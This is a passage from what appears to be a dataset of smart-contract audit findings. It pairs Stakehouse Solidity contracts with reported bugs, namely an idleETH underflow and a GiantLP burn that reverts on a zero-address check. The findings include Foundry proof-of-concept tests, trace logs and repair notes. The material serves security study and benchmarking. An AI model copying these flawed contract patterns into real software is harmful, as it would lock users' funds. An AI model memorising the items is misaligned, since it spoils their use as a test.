LPToken[(1);\n        temp[0] = lp;\n        lpToken[0] = temp;\n\n        emit log_uint(address(giantFeesAndMevPool).balance);\n        giantFeesAndMevPool.bringUnusedETHBackIntoGiantPool(getAddressArrayFromValues(address(stakingFundsVault)),lpToken, stakeAmountsForVaults);\n\n        emit log_uint(address(giantFeesAndMevPool).balance);\n        vm.expectRevert();\n        giantFeesAndMevPool.batchDepositETHForStaking(getAddressArrayFromValues(address(stakingFundsVault)),getUint256ArrayFromValues(1 ether) , blsKeysForVaults, stakeAmountsForVaults);\n\n        vm.expectRevert();\n        giantSavETHPool.withdrawETH(1 ether);\n\n        vm.stopPrank();\n    }\n\n\n\n\nBoth withdrawing eth for user and depositing eth to stake fails and reverts as shown in the poc due to underflow in idleETH.\n\nNote that the same problem also exists in GiantSavETHVaultPool, however a poc cannot be done for it as another bug exist in GiantSavETHVaultPool which prevents it from receiving funds as it lacks a receive() or fallback() implementation.\n\n\nFoundry\n\n",
                "Repair": "\nUpdate idleETH in withdrawUnusedETHToGiantPool\n\nvince0656 (Stakehouse) confirmed(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/115)\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\n/// @notice Allows a contract to receive rewards from a syndicate and distribute it amongst LP holders\nabstract contract SyndicateRewardsProcessor {\n\n    /// @notice Emitted when ETH is received by the contract and processed\n    event ETHReceived(uint256 amount);\n\n    /// @notice Emitted when ETH from syndicate is distributed to a user\n    event ETHDistributed(address indexed user, address indexed recipient, uint256 amount);\n\n    /// @notice Precision used in rewards calculations for scaling up and down\n    uint256 public constant PRECISION = 1e24;\n\n    /// @notice Total accumulated ETH per share of LP<>KNOT that has minted derivatives scaled to 'PRECISION'\n    uint256 public accumulatedETHPerLPShare;\n\n    /// @notice Total ETH claimed by all users of the contract\n    uint256 public totalClaimed;\n\n    /// @notice Last total rewards seen by the contract\n    uint256 public totalETHSeen;\n\n    /// @notice Total ETH claimed by a given address for a given token\n    mapping(address => mapping(address => uint256)) public claimed;\n\n    /// @dev Internal logic for previewing accumulated ETH for an LP user\n    function _previewAccumulatedETH(\n        address _sender,\n        address _token,\n        uint256 _balanceOfSender,\n        uint256 _numOfShares,\n        uint256 _unclaimedETHFromSyndicate\n    ) internal view returns (uint256) {\n        if (_balanceOfSender > 0) {\n            uint256 claim = claimed[_sender][_token];\n\n            uint256 received = totalRewardsReceived() + _unclaimedETHFromSyndicate;\n            uint256 unprocessed = received - totalETHSeen;\n\n            uint256 newAccumulatedETH = accumulatedETHPerLPShare + ((unprocessed * PRECISION) / _numOfShares);\n\n            return ((newAccumulatedETH * _balanceOfSender) / PRECISION) - claim;\n        }\n        return 0;\n    }\n\n    /// @dev Any due rewards from node running can be distributed to msg.sender if they have an LP balance\n    function _distributeETHRewardsToUserForToken(\n        address _user,\n        address _token,\n        uint256 _balance,\n        address _recipient\n    ) internal {\n        require(_recipient != address(0), \"Zero address\");\n        uint256 balance = _balance;\n        if (balance > 0) {\n            // Calculate how much ETH rewards the address is owed / due \n            uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];\n            if (due > 0) {\n                claimed[_user][_token] = due;\n\n                totalClaimed += due;\n\n                (bool success, ) = _recipient.call{value: due}(\"\");\n                require(success, \"Failed to transfer\");\n\n                emit ETHDistributed(_user, _recipient, due);\n            }\n        }\n    }\n\n    /// @dev Internal logic for tracking accumulated ETH per share\n    function _updateAccumulatedETHPerLP(uint256 _numOfShares) internal {\n        if (_numOfShares > 0) {\n            uint256 received = totalRewardsReceived();\n            uint256 unprocessed = received - totalETHSeen;\n\n            if (unprocessed > 0) {\n                emit ETHReceived(unprocessed);\n\n                // accumulated ETH per minted share is scaled to avoid precision loss. it is scaled down later\n                accumulatedETHPerLPShare += (unprocessed * PRECISION) / _numOfShares;\n\n                totalETHSeen = received;\n            }\n        }\n    }\n\n    /// @notice Total rewards received by this contract from the syndicate\n    function totalRewardsReceived() public virtual view returns (uint256) {\n        return address(this).balance + totalClaimed;\n    }\n\n    /// @notice Allow the contract to receive ETH\n    receive() external payable {}\n}\n\npragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { GiantLP } from \"./GiantLP.sol\";\nimport { StakingFundsVault } from \"./StakingFundsVault.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { GiantPoolBase } from \"./GiantPoolBase.sol\";\nimport { SyndicateRewardsProcessor } from \"./SyndicateRewardsProcessor.sol\";\nimport { LSDNFactory } from \"./LSDNFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\n\n/// @notice A giant pool that can provide liquidity to any liquid staking network's staking funds vault\ncontract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, SyndicateRewardsProcessor {\n\n    constructor(LSDNFactory _factory) {\n        lpTokenETH = new GiantLP(address(this), address(this), \"GiantETHLP\", \"gMevETH\");\n        liquidStakingDerivativeFactory = _factory;\n    }\n\n    /// @notice Stake ETH against multiple BLS keys within multiple LSDNs and specify the amount of ETH being supplied for each key\n    /// @dev Uses contract balance for funding and get Staking Funds Vault LP in exchange for ETH\n    /// @param _stakingFundsVault List of mev and fees vaults being interacted with\n    /// @param _ETHTransactionAmounts ETH being attached to each savETH vault in the list\n    /// @param _blsPublicKeyOfKnots For every staking funds vault, the list of BLS keys of LSDN validators receiving funding\n    /// @param _amounts List of amounts of ETH being staked per BLS public key\n    function batchDepositETHForStaking(\n        address[] calldata _stakingFundsVault,\n        uint256[] calldata _ETHTransactionAmounts,\n        bytes[][] calldata _blsPublicKeyOfKnots,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVault.length;\n        require(numOfVaults > 0, \"Zero vaults\");\n        require(numOfVaults == _blsPublicKeyOfKnots.length, \"Inconsistent lengths\");\n        require(numOfVaults == _amounts.length, \"Inconsistent lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            // As ETH is being deployed to a staking funds vault, it is no longer idle\n            idleETH -= _ETHTransactionAmounts[i];\n\n            StakingFundsVault sfv = StakingFundsVault(payable(_stakingFundsVault[i]));\n            require(\n                liquidStakingDerivativeFactory.isLiquidStakingManager(address(sfv.liquidStakingNetworkManager())),\n                \"Invalid liquid staking manager\"\n            );\n\n            sfv.batchDepositETHForStaking{ value: _ETHTransactionAmounts[i] }(\n                _blsPublicKeyOfKnots[i],\n                _amounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow a giant LP to claim a % of the revenue received by the MEV and Fees Pool\n    function claimRewards(\n        address _recipient,\n        address[] calldata _stakingFundsVaults,\n        bytes[][] calldata _blsPublicKeysForKnots\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty array\");\n        require(numOfVaults == _blsPublicKeysForKnots.length, \"Inconsistent array lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).claimRewards(\n                address(this),\n                _blsPublicKeysForKnots[i]\n            );\n        }\n\n        updateAccumulatedETHPerLP();\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            _recipient\n        );\n    }\n\n    /// @notice Preview total ETH accumulated by an address\n    function previewAccumulatedETH(\n        address _user,\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens\n    ) external view returns (uint256) {\n        require(_stakingFundsVaults.length == _lpTokens.length, \"Inconsistent array lengths\");\n\n        uint256 accumulated;\n        for (uint256 i; i < _stakingFundsVaults.length; ++i) {\n            accumulated = StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(\n                address(this),\n                _lpTokens[i]\n            );\n        }\n\n        return _previewAccumulatedETH(_user, address(lpTokenETH), lpTokenETH.balanceOf(_user), lpTokenETH.totalSupply(), accumulated);\n    }\n\n    /// @notice Any ETH supplied to a BLS key registered with a liquid staking network can be rotated to another key if it never gets staked\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _oldLPTokens List of savETH vault LP tokens that the vault has\n    /// @param _oldLPTokens List of new savETH vault LP tokens that the vault wants to receive in exchange for moving ETH to a new KNOT\n    /// @param _amounts Amount of old being swapped for new per LP token\n    function batchRotateLPTokens(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _oldLPTokens,\n        LPToken[][] calldata _newLPTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _stakingFundsVaults.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _oldLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n        require(lpTokenETH.balanceOf(msg.sender) >= 0.5 ether, \"No common interest\");\n        for (uint256 i; i < numOfRotations; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).batchRotateLPTokens(_oldLPTokens[i], _newLPTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Any ETH that has not been utilized by a Staking Funds vault can be brought back into the giant pool\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a staking funds vault\n    /// @param _amounts Amounts of LP within the giant pool being burnt\n    function bringUnusedETHBackIntoGiantPool(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).burnLPTokensForETH(_lpTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Distribute any new ETH received to LP holders\n    function updateAccumulatedETHPerLP() public {\n        _updateAccumulatedETHPerLP(lpTokenETH.totalSupply());\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function beforeTokenTransfer(address _from, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        updateAccumulatedETHPerLP();\n\n        // Make sure that `_from` gets total accrued before transfer as post transferred anything owed will be wiped\n        if (_from != address(0)) {\n            _distributeETHRewardsToUserForToken(\n                _from,\n                address(lpTokenETH),\n                lpTokenETH.balanceOf(_from),\n                _from\n            );\n        }\n\n        // Make sure that `_to` gets total accrued before transfer as post transferred anything owed will be wiped\n        _distributeETHRewardsToUserForToken(\n            _to,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(_to),\n            _to\n        );\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function afterTokenTransfer(address, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        _setClaimedToMax(_to);\n    }\n\n    /// @notice Total rewards received by this contract from the syndicate excluding idle ETH from LP depositors\n    function totalRewardsReceived() public view override returns (uint256) {\n        return address(this).balance + totalClaimed - idleETH;\n    }\n\n    /// @dev On withdrawing LP in exchange for burning giant LP, claim rewards\n    function _onWithdraw(LPToken[] calldata _lpTokens) internal override {\n        // Use the transfer hook of LPToken to trigger the claiming accrued ETH\n        for (uint256 i; i < _lpTokens.length; ++i) {\n            _lpTokens[i].transfer(address(this), _lpTokens[i].balanceOf(address(this)));\n        }\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            msg.sender\n        );\n    }\n\n    /// @dev On depositing on ETH set claimed to max claim so the new depositor cannot claim ETH that they have not accrued\n    function _onDepositETH() internal override {\n        _setClaimedToMax(msg.sender);\n    }\n\n    /// @dev Internal re-usable method for setting claimed to max for msg.sender\n    function _setClaimedToMax(address _user) internal {\n        // New ETH stakers are not entitled to ETH earned by\n        claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;\n    }\n}\n\npragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { Initializable } from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport { ERC20PermitUpgradeable } from \"@openzeppelin/contracts-upgradeable/token/ERC20/extensions/draft-ERC20PermitUpgradeable.sol\";\nimport { ILPTokenInit } from \"../interfaces/ILPTokenInit.sol\";\nimport { ILiquidStakingManagerChildContract } from \"../interfaces/ILiquidStakingManagerChildContract.sol\";\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\n\ncontract LPToken is ILPTokenInit, ILiquidStakingManagerChildContract, Initializable, ERC20PermitUpgradeable {\n\n    /// @notice Contract deployer that can control minting and burning but is associated with a liquid staking manager\n    address public deployer;\n\n    /// @notice Optional hook for processing transfers\n    ITransferHookProcessor transferHookProcessor;\n\n    /// @notice Whenever the address last interacted with a token\n    mapping(address => uint256) public lastInteractedTimestamp;\n\n    modifier onlyDeployer {\n        require(msg.sender == deployer, \"Only savETH vault\");\n        _;\n    }\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() initializer {}\n\n    /// @param _deployer Address of the account deploying the LP token\n    /// @param _transferHookProcessor Optional contract account that can be notified about transfer hooks\n    function init(\n        address _deployer,\n        address _transferHookProcessor,\n        string calldata _tokenSymbol,\n        string calldata _tokenName\n    ) external override initializer {\n        deployer = _deployer;\n        transferHookProcessor = ITransferHookProcessor(_transferHookProcessor);\n        __ERC20_init(_tokenName, _tokenSymbol);\n        __ERC20Permit_init(_tokenName);\n    }\n\n    /// @notice Mints a given amount of LP tokens\n    /// @dev Only savETH vault can mint\n    function mint(address _recipient, uint256 _amount) external onlyDeployer {\n        _mint(_recipient, _amount);\n    }\n\n    /// @notice Allows a LP token owner to burn their tokens\n    function burn(address _recipient, uint256 _amount) external onlyDeployer {\n        _burn(_recipient, _amount);\n    }\n\n    /// @notice In order to know the liquid staking network and manager associated with the LP token, call this\n    function liquidStakingManager() external view returns (address) {\n        return ILiquidStakingManagerChildContract(deployer).liquidStakingManager();\n    }\n\n    /// @dev If set, notify the transfer hook processor before token transfer\n    function _beforeTokenTransfer(address _from, address _to, uint256 _amount) internal override {\n        if (address(transferHookProcessor) != address(0)) transferHookProcessor.beforeTokenTransfer(_from, _to, _amount);\n    }\n\n    /// @dev If set, notify the transfer hook processor after token transfer\n    function _afterTokenTransfer(address _from, address _to, uint256 _amount) internal override {\n        lastInteractedTimestamp[_from] = block.timestamp;\n        lastInteractedTimestamp[_to] = block.timestamp;\n        if (address(transferHookProcessor) != address(0)) transferHookProcessor.afterTokenTransfer(_from, _to, _amount);\n    }\n}\n\npragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\n/// @dev Interface for initializing a newly deployed LP token\ninterface ILPTokenInit {\n    function init(\n        address _deployer,\n        address _transferHookProcessor,\n        string calldata tokenSymbol,\n        string calldata tokenName\n    ) external;\n}\n\npragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { ERC20 } from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\n\ncontract GiantLP is ERC20 {\n\n    /// @notice Address of giant pool that deployed the giant LP token\n    address public pool;\n\n    /// @notice Optional address of contract that will process transfers of giant LP\n    ITransferHookProcessor public transferHookProcessor;\n\n    /// @notice Last interacted timestamp for a given address\n    mapping(address => uint256) public lastInteractedTimestamp;\n\n    constructor(\n        address _pool,\n        address _transferHookProcessor,\n        string memory _name,\n        string memory _symbol\n    ) ERC20(_name, _symbol) {\n        pool = _pool;\n        transferHookProcessor = ITransferHookProcessor(_transferHookProcessor);\n    }\n\n    function mint(address _recipient, uint256 _amount) external {\n        require(msg.sender == pool, \"Only pool\");\n        _mint(_recipient, _amount);\n    }\n\n    function burn(address _recipient, uint256 _amount) external {\n        require(msg.sender == pool, \"Only pool\");\n        _burn(_recipient, _amount);\n    }\n\n    function _beforeTokenTransfer(address _from, address _to, uint256 _amount) internal override {\n        if (address(transferHookProcessor) != address(0)) ITransferHookProcessor(transferHookProcessor).beforeTokenTransfer(_from, _to, _amount);\n    }\n\n    function _afterTokenTransfer(address _from, address _to, uint256 _amount) internal override {\n        lastInteractedTimestamp[_from] = block.timestamp;\n        lastInteractedTimestamp[_to] = block.timestamp;\n        if (address(transferHookProcessor) != address(0)) ITransferHookProcessor(transferHookProcessor).afterTokenTransfer(_from, _to, _amount);\n    }\n}\n\n",
        "CodeNames": [
            "SyndicateRewardsProcessor.sol",
            "GiantMevAndFeesPool.sol",
            "LPToken.sol",
            "ILPTokenInit.sol",
            "GiantLP.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-07",
                "Location": [
                    "transferHookProcessor",
                    "_distributeETHRewardsToUserForToken",
                    "_burn",
                    "withdrawETH",
                    "transferHookProcessor.beforeTokenTransfer(_from, _to, _amount)"
                ],
                "Type": " GiantLP with a  transferHookProcessor  cant be burned, users' funds will be stuck in the Giant Pool",
                "Description": "*Submitted by ronnyx2017(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/116), also found by Trust(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/404), rotcivegaf(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/191), 9svR6w(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/182), Lambda(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/142), and HE1M(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/60)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantLP.sol#L39-L47<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L73-L78<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L57<br\n\nThe GiantLP with a transferHookProcessor will call transferHookProcessor.beforeTokenTransfer(_from, _to, _amount) when it's transferred / minted / burned.\n\nBut the to address is address(0x00) in the erc20 _burn function. The GiantMevAndFeesPool.beforeTokenTransfer will call the function SyndicateRewardsProcessor._distributeETHRewardsToUserForToken will a zero address check in the first line:\n\n    function _distributeETHRewardsToUserForToken(...) internal {\n        require(_recipient != address(0), \"Zero address\");\n\nSo any withdraw function with a operation of burning the GiantLP token with a transferHookProcessor will revert because of the zero address check. The users' funds will be stuck in the Giant Pool contracts.\n\n\nI wrote a test about GiantMevAndFeesPool.withdrawETH function which is used to withdraw eth from the Giant Pool. It will be reverted.\n\ntest/foundry/LpBurn.t.sol\n\n    pragma solidity ^0.8.13;\n\n    // SPDX-License-Identifier: MIT\n    import {GiantPoolTests} from \"./GiantPools.t.sol\";\n\n    contract LpBurnTests is GiantPoolTests {\n        function testburn() public{\n            address feesAndMevUserOne = accountOne; vm.deal(feesAndMevUserOne, 4 ether);\n            vm.startPrank(feesAndMevUserOne);\n            giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);\n            giantFeesAndMevPool.withdrawETH(4 ether);\n            vm.stopPrank();\n        }\n    }\n\nrun test\n\n    forge test --match-test testburn -vvv\n\ntest log:\n\n    ...\n    ...\n        \u251c\u2500 115584] GiantMevAndFeesPool::withdrawETH(4000000000000000000) \n        \u2502   \u251c\u2500 585] GiantLP::balanceOf(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266) staticcall]\n        \u2502   \u2502   \u2514\u2500 \u2190 4000000000000000000\n        \u2502   \u251c\u2500 128081] GiantLP::burn(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, 4000000000000000000) \n        \u2502   \u2502   \u251c\u2500 126775] GiantMevAndFeesPool::beforeTokenTransfer(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, 0x0000000000000000000000000000000000000000, 4000000000000000000) \n        \u2502   \u2502   \u2502   \u251c\u2500 371] GiantLP::totalSupply() staticcall]\n        \u2502   \u2502   \u2502   \u2502   \u2514\u2500 \u2190 4000000000000000000\n        \u2502   \u2502   \u2502   \u251c\u2500 emit ETHReceived(amount: 4000000000000000000)\n        \u2502   \u2502   \u2502   \u251c\u2500 585] GiantLP::balanceOf(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266) staticcall]\n        \u2502   \u2502   \u2502   \u2502   \u2514\u2500 \u2190 4000000000000000000\n        \u2502   \u2502   \u2502   \u251c\u2500 0] 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266::fallback{value: 4000000000000000000}() \n        \u2502   \u2502   \u2502   \u2502   \u2514\u2500 \u2190 ()\n        \u2502   \u2502   \u2502   \u251c\u2500 emit ETHDistributed(user: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, recipient: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, amount: 4000000000000000000)\n        \u2502   \u2502   \u2502   \u251c\u2500 2585] GiantLP::balanceOf(0x0000000000000000000000000000000000000000) staticcall]\n        \u2502   \u2502   \u2502   \u2502   \u2514\u2500 \u2190 0\n        \u2502   \u2502   \u2502   \u2514\u2500 \u2190 \"Zero address\"\n        \u2502   \u2502   \u2514\u2500 \u2190 \"Zero address\"\n        \u2502   \u2514\u2500 \u2190 \"Zero address\"\n        \u2514\u2500 \u2190 \"Zero address\"\n\n\nfoundry\n\n",
                "Repair": "\nSkip update rewards for zero address.\n\nvince0656 (Stakehouse) confirmed duplicate issue #60(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/60#event-7905446439)\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\n/// @notice Allows a contract to receive rewards from a syndicate and distribute it amongst LP holders\nabstract contract SyndicateRewardsProcessor {\n\n    /// @notice Emitted when ETH is received by the contract and processed\n    event ETHReceived(uint256 amount);\n\n    /// @notice Emitted when ETH from syndicate is distributed to a user\n    event ETHDistributed(address indexed user, address indexed recipient, uint256 amount);\n\n    /// @notice Precision used in rewards calculations for scaling up and down\n    uint256 public constant PRECISION = 1e24;\n\n    /// @notice Total accumulated ETH per share of LP<>KNOT that has minted derivatives scaled to 'PRECISION'\n    uint256 public accumulatedETHPerLPShare;\n\n    /// @notice Total ETH claimed by all users of the contract\n    uint256 public totalClaimed;\n\n    /// @notice Last total rewards seen by the contract\n    uint256 public totalETHSeen;\n\n    /// @notice Total ETH claimed by a given address for a given token\n    mapping(address => mapping(address => uint256)) public claimed;\n\n    /// @dev Internal logic for previewing accumulated ETH for an LP user\n    function _previewAccumulatedETH(\n        address _sender,\n        address _token,\n        uint256 _balanceOfSender,\n        uint256 _numOfShares,\n        uint256 _unclaimedETHFromSyndicate\n    ) internal view returns (uint256) {\n        if (_balanceOfSender > 0) {\n            uint256 claim = claimed[_sender][_token];\n\n            uint256 received = totalRewardsReceived() + _unclaimedETHFromSyndicate;\n            uint256 unprocessed = received - totalETHSeen;\n\n            uint256 newAccumulatedETH = accumulatedETHPerLPShare + ((unprocessed * PRECISION) / _numOfShares);\n\n            return ((newAccumulatedETH * _balanceOfSender) / PRECISION) - claim;\n        }\n        return 0;\n    }\n\n    /// @dev Any due rewards from node running can be distributed to msg.sender if they have an LP balance\n    function _distributeETHRewardsToUserForToken(\n        address _user,\n        address _token,\n        uint256 _balance,\n        address _recipient\n    ) internal {\n        require(_recipient != address(0), \"Zero address\");\n        uint256 balance = _balance;\n        if (balance > 0) {\n            // Calculate how much ETH rewards the address is owed / due \n            uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];\n            if (due > 0) {\n                claimed[_user][_token] = due;\n\n                totalClaimed += due;\n\n                (bool success, ) = _recipient.call{value: due}(\"\");\n                require(success, \"Failed to transfer\");\n\n                emit ETHDistributed(_user, _recipient, due);\n            }\n        }\n    }\n\n    /// @dev Internal logic for tracking accumulated ETH per share\n    function _updateAccumulatedETHPerLP(uint256 _numOfShares) internal {\n        if (_numOfShares > 0) {\n            uint256 received = totalRewardsReceived();\n            uint256 unprocessed = received - totalETHSeen;\n\n            if (unprocessed > 0) {\n                emit ETHReceived(unprocessed);\n\n                // accumulated ETH per minted share is scaled to avoid precision loss. it is scaled down later\n                accumulatedETHPerLPShare += (unprocessed * PRECISION) / _numOfShares;\n\n                totalETHSeen = received;\n            }\n        }\n    }\n\n    /// @notice Total rewards received by this contract from the syndicate\n    function totalRewardsReceived() public virtual view returns (uint256) {\n        return address(this).balance + totalClaimed;\n    }\n\n    /// @notice Allow the contract to receive ETH\n    receive() external payable {}\n}\n\npragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { GiantLP } from \"./GiantLP.sol\";\nimport { StakingFundsVault } from \"./StakingFundsVault.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { GiantPoolBase } from \"./GiantPoolBase.sol\";\nimport { SyndicateRewardsProcessor } from \"./SyndicateRewardsProcessor.sol\";\nimport { LSDNFactory } from \"./LSDNFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\n\n/// @notice A giant pool that can provide liquidity to any liquid staking network's staking funds vault\ncontract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, SyndicateRewardsProcessor {\n\n    constructor(LSDNFactory _factory) {\n        lpTokenETH = new GiantLP(address(this), address(this), \"GiantETHLP\", \"gMevETH\");\n        liquidStakingDerivativeFactory = _factory;\n    }\n\n    /// @notice Stake ETH against multiple BLS keys within multiple LSDNs and specify the amount of ETH being supplied for each key\n    /// @dev Uses contract balance for funding and get Staking Funds Vault LP in exchange for ETH\n    /// @param _stakingFundsVault List of mev and fees vaults being interacted with\n    /// @param _ETHTransactionAmounts ETH being attached to each savETH vault in the list\n    /// @param _blsPublicKeyOfKnots For every staking funds vault, the list of BLS keys of LSDN validators receiving funding\n    /// @param _amounts List of amounts of ETH being staked per BLS public key\n    function batchDepositETHForStaking(\n        address[] calldata _stakingFundsVault,\n        uint256[] calldata _ETHTransactionAmounts,\n        bytes[][] calldata _blsPublicKeyOfKnots,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVault.length;\n        require(numOfVaults > 0, \"Zero vaults\");\n        require(numOfVaults == _blsPublicKeyOfKnots.length, \"Inconsistent lengths\");\n        require(numOfVaults == _amounts.length, \"Inconsistent lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            // As ETH is being deployed to a staking funds vault, it is no longer idle\n            idleETH -= _ETHTransactionAmounts[i];\n\n            StakingFundsVault sfv = StakingFundsVault(payable(_stakingFundsVault[i]));\n            require(\n                liquidStakingDerivativeFactory.isLiquidStakingManager(address(sfv.liquidStakingNetworkManager())),\n                \"Invalid liquid staking manager\"\n            );\n\n            sfv.batchDepositETHForStaking{ value: _ETHTransactionAmounts[i] }(\n                _blsPublicKeyOfKnots[i],\n                _amounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow a giant LP to claim a % of the revenue received by the MEV and Fees Pool\n    function claimRewards(\n        address _recipient,\n        address[] calldata _stakingFundsVaults,\n        bytes[][] calldata _blsPublicKeysForKnots\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty array\");\n        require(numOfVaults == _blsPublicKeysForKnots.length, \"Inconsistent array lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).claimRewards(\n                address(this),\n                _blsPublicKeysForKnots[i]\n            );\n        }\n\n        updateAccumulatedETHPerLP();\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            _recipient\n        );\n    }\n\n    /// @notice Preview total ETH accumulated by an address\n    function previewAccumulatedETH(\n        address _user,\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens\n    ) external view returns (uint256) {\n        require(_stakingFundsVaults.length == _lpTokens.length, \"Inconsistent array lengths\");\n\n        uint256 accumulated;\n        for (uint256 i; i < _stakingFundsVaults.length; ++i) {\n            accumulated = StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(\n                address(this),\n                _lpTokens[i]\n            );\n        }\n\n        return _previewAccumulatedETH(_user, address(lpTokenETH), lpTokenETH.balanceOf(_user), lpTokenETH.totalSupply(), accumulated);\n    }\n\n    /// @notice Any ETH supplied to a BLS key registered with a liquid staking network can be rotated to another key if it never gets staked\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _oldLPTokens List of savETH vault LP tokens that the vault has\n    /// @param _oldLPTokens List of new savETH vault LP tokens that the vault wants to receive in exchange for moving ETH to a new KNOT\n    /// @param _amounts Amount of old being swapped for new per LP token\n    function batchRotateLPTokens(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _oldLPTokens,\n        LPToken[][] calldata _newLPTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _stakingFundsVaults.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _oldLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n        require(lpTokenETH.balanceOf(msg.sender) >= 0.5 ether, \"No common interest\");\n        for (uint256 i; i < 